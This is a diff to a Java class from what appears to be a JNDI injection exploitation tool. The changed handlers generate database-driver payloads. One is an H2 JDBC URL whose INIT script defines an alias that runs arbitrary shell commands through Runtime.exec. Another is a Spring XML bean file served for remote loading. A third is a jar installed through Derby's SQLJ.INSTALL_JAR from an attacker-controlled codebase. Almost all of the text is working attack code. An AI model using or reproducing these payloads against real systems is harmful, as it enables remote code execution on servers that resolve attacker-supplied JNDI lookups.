@@ -87,7 +87,7 @@ public class DatabaseController implements Controller {
                 "        </constructor-arg>\n" +
                 "    </bean>\n" +
                 "</beans>";
-        WebServer.serveFile( "/" + fileName, fileContent.getBytes());
+        WebServer.getInstance().serveFile( "/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
         String socketFactoryArg = Config.codebase + fileName;
@@ -100,9 +100,9 @@ public class DatabaseController implements Controller {
         return props;
     }
 
-    @JNDIMapping("/H2/Alias/{cmd}")
-    public Properties h2Alias(String cmd) {
-        System.out.println("[H2] [CREATE ALIAS] Cmd: " + cmd);
+    @JNDIMapping("/H2/Java/{cmd}")
+    public Properties h2Java(String cmd) {
+        System.out.println("[H2] [Java] Cmd: " + cmd);
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                 "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
@@ -195,7 +195,7 @@ public class DatabaseController implements Controller {
 
         String jarName = className;
         byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
-        WebServer.serveFile("/" + jarName + ".jar", jarBytes);
+        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
 
         List<String> list = new ArrayList<>();
         list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + jarName + ".jar', 'APP." + className + "', 0)");
